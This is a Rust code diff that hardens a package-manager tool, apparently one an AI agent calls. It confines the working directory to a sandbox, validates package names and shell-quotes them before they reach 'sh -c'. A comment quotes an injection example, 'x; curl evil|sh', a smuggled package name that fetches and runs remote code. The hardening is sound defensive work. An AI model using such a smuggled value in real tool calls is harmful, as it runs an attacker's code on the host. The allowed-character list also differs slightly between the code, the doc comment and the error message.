@@ -50,7 +50,7 @@ impl Skill for PackageManagerSkill {
         })
     }
 
-    async fn execute(&self, _ctx: &SkillContext, args: serde_json::Value) -> Result<SkillResult, SkillError> {
+    async fn execute(&self, ctx: &SkillContext, args: serde_json::Value) -> Result<SkillResult, SkillError> {
         let action = args.get("action").and_then(|v| v.as_str())
             .ok_or_else(|| SkillError::InvalidArguments("Missing 'action' field".into()))?;
 
@@ -62,9 +62,17 @@ impl Skill for PackageManagerSkill {
         let global = args.get("global").and_then(|v| v.as_bool()).unwrap_or(false);
         let cwd = args.get("cwd").and_then(|v| v.as_str());
 
+        // The directory is confined before anything else uses it — including
+        // the manager probe below, which used to stat `package.json` under
+        // whatever path the model supplied. It also becomes the sandbox cwd
+        // and joins the bound workspace roots, so `npm install` writing into
+        // the office is allowed and a `cd` away from it is not.
+        let dir = crate::exec::resolve_cwd(ctx, cwd)?;
+        let dir_str = dir.to_string_lossy().to_string();
+
         // Auto-detect manager if needed
         let manager = match manager {
-            Some("auto") | None => self.detect_manager(cwd).await,
+            Some("auto") | None => self.detect_manager(Some(&dir_str)).await,
             Some(m) => m.to_string(),
         };
 
@@ -72,13 +80,11 @@ impl Skill for PackageManagerSkill {
             return Ok(SkillResult::failure("Could not auto-detect package manager. Please specify one.".to_string()));
         }
 
-        let cmd = self.build_command(&manager, action, &packages, global);
+        let cmd = self.build_command(&manager, action, &packages, global)?;
 
-        let mut command = tokio::process::Command::new("sh");
-        command.args(["-c", &cmd]);
-        if let Some(cwd) = cwd {
-            command.current_dir(cwd);
-        }
+        let mut command = crate::exec::runner_for(ctx)
+            .command("sh", &["-c".to_string(), cmd], Some(&dir))
+            .map_err(SkillError::Execution)?;
 
         let output = tokio::time::timeout(
             std::time::Duration::from_secs(120),
@@ -134,8 +140,42 @@ impl PackageManagerSkill {
         }
     }
 
-    fn build_command(&self, manager: &str, action: &str, packages: &[String], global: bool) -> String {
-        let pkgs = packages.join(" ");
+    /// Build the command line for a package-manager invocation.
+    ///
+    /// `packages` are validated before they are interpolated, and quoted after
+    /// that. They used to be `join(" ")`ed straight into a `sh -c` string, so
+    /// `packages: ["x; curl evil|sh"]` was a shell command. A package name has
+    /// a narrow grammar — letters, digits, and `. _ - + @ / ~ ^` — and
+    /// anything outside it is refused rather than escaped, because a name that
+    /// needs escaping was never a package name.
+    fn build_command(
+        &self,
+        manager: &str,
+        action: &str,
+        packages: &[String],
+        global: bool,
+    ) -> Result<String, SkillError> {
+        for p in packages {
+            if p.is_empty() || p.len() > 214 {
+                return Err(SkillError::InvalidArguments(format!(
+                    "Invalid package name {p:?}."
+                )));
+            }
+            if !p
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || "._-+@/~^:=,".contains(c))
+                || p.starts_with('-')
+            {
+                return Err(SkillError::InvalidArguments(format!(
+                    "Invalid package name {p:?}: use letters, digits, and . _ - + @ / only."
+                )));
+            }
+        }
+        let pkgs = packages
+            .iter()
+            .map(|p| crate::exec::shell_quote(p))
+            .collect::<Vec<_>>()
+            .join(" ");
         match (manager, action) {
             ("npm", "install") => if pkgs.is_empty() { "npm install 2>&1".to_string() } else { format!("npm install {} 2>&1", pkgs) },
             ("npm", "uninstall") => format!("npm uninstall {} 2>&1", pkgs),
@@ -176,10 +216,24 @@ impl PackageManagerSkill {
             ("brew", "outdated") => "brew outdated 2>&1".to_string(),
             ("go", "install") => format!("go install {} 2>&1", pkgs),
             ("go", "update") => "go get -u ./... 2>&1".to_string(),
-            _ => format!("echo 'Unsupported: {} {}'", manager, action),
+            _ => format!(
+                "echo 'Unsupported: {} {}'",
+                crate::exec::shell_quote(manager),
+                crate::exec::shell_quote(action)
+            ),
         }
+        .pipe(Ok)
     }
 }
+
+/// `Result::map` for a value that is already the success case, so the big
+/// `match` above can keep returning `String` without every arm wrapping itself.
+trait Pipe: Sized {
+    fn pipe<T>(self, f: impl FnOnce(Self) -> T) -> T {
+        f(self)
+    }
+}
+impl<T> Pipe for T {}
 
 impl Default for PackageManagerSkill {
     fn default() -> Self { Self::new() }
